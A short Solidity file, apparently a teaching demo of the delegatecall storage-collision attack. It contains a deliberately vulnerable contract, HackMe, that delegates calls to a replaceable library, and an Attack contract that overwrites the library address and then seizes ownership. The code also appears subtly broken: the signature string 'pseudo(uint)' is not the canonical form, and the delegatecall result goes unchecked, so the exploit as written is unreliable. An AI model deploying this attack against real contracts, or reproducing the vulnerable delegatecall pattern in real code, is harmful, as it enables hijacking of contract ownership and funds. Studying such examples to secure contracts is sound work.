pragma solidity ^0.8.13;

contract Lib {

    uint public num;

    function pseudo(uint _num) public {

        num = _num;
    }

}

contract HackMe {

    address public lib;

    address public owner;

    uint public number;

    constructor(address _lib) {

        owner = msg.sender;

        lib = _lib;
    }

    function foo(uint _num) public {

        lib.delegatecall(abi.encodeWithSignature("pseudo(uint)", _num));
    }

}

contract Attack {

    address public lib;

    address public owner;

    uint public number;

    HackMe public hackMe;

    constructor(HackMe _hackMe) {

        hackMe = HackMe(_hackMe);
    }

    function attack() public {

        hackMe.foo(uint(uint160(address(this))));

        hackMe.foo(2);
    }

    function pseudo(uint _num) public {

        owner = msg.sender;
    }

}
